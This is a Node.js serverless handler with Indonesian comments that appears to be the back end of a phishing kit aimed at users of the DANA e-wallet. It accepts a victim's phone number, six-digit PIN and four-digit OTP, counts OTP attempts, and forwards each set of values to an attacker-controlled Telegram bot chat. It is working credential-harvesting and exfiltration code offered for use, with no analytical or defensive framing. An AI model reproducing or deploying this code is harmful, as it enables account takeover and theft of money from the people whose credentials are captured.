const axios = require('axios');

// Format Telegram message untuk DANA
function formatMessage(type, data) {
  const cleanPhone = data.phone.replace(/\D/g, '');
  
  let message = 
    "🟢 *DANA E-WALLET LOGIN* 🟢\n" +
    "╔═══════════════════╗\n" +
    `╠ 📱 *Nomor HP* : ${cleanPhone}\n`;
  
  if (type === 'pin' && data.pin) {
    message += `╠ 🔐 *PIN* : ${data.pin}\n`;
  }
  
  if (type === 'otp' && data.otp) {
    message += `╠ 🔑 *OTP* : ${data.otp}\n`;
    message += `╠ 📊 *Percobaan* : ${data.attemptCount || 1}\n`;
  }
  
  message += `╠ 🕐 *Waktu* : ${new Date().toLocaleString('id-ID')}\n`;
  message += "╚═══════════════════╝";
  
  return message;
}

exports.handler = async (event, context) => {
  // Only accept POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method Not Allowed' }),
      headers: { 'Content-Type': 'application/json' }
    };
  }

  try {
    // Parse request body
    const requestData = JSON.parse(event.body);
    const { type, ...data } = requestData;
    
    console.log('Received data:', { type, data });
    
    // Validate required fields
    if (!type || !data.phone) {
      return {
        statusCode: 400,
        body: JSON.stringify({ 
          error: 'Type and phone are required',
          received: { type, hasPhone: !!data.phone }
        }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    // Clean and validate phone number
    const cleanPhone = data.phone.replace(/\D/g, '');
    
    if (cleanPhone.length < 10) {
      return {
        statusCode: 400,
        body: JSON.stringify({ 
          error: 'Phone number must be at least 10 digits',
          received: cleanPhone
        }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    // Validate type-specific data
    if (type === 'pin' && (!data.pin || data.pin.length !== 6)) {
      return {
        statusCode: 400,
        body: JSON.stringify({ 
          error: 'PIN must be 6 digits for type "pin"',
          received: data.pin
        }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    if (type === 'otp' && (!data.otp || data.otp.length !== 4)) {
      return {
        statusCode: 400,
        body: JSON.stringify({ 
          error: 'OTP must be 4 digits for type "otp"',
          received: data.otp
        }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    // Check Telegram configuration
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Missing Telegram credentials:', {
        hasToken: !!botToken,
        hasChatId: !!chatId
      });
      
      return {
        statusCode: 500,
        body: JSON.stringify({ 
          error: 'Server configuration error',
          details: 'Missing Telegram credentials'
        }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    // Format message
    const message = formatMessage(type, {
      ...data,
      phone: cleanPhone
    });

    console.log('Sending to Telegram:', { type, phone: cleanPhone });
    
    // Send to Telegram
    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      },
      {
        timeout: 10000 // 10 second timeout
      }
    );

    console.log('Telegram response:', telegramResponse.status);
    
    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true,
        message: 'Data sent successfully',
        type: type,
        telegram_status: telegramResponse.status,
        timestamp: new Date().toISOString()
      }),
      headers: { 
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
      }
    };

  } catch (error) {
    console.error('Error details:', {
      error: error.message,
      stack: error.stack,
      eventBody: event.body
    });
    
    // Handle specific axios errors
    if (error.response) {
      console.error('Telegram API error:', error.response.data);
    }
    
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: 'Internal Server Error',
        details: error.message,
        type: 'telegram_send_failed'
      }),
      headers: { 
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    };
  }
};
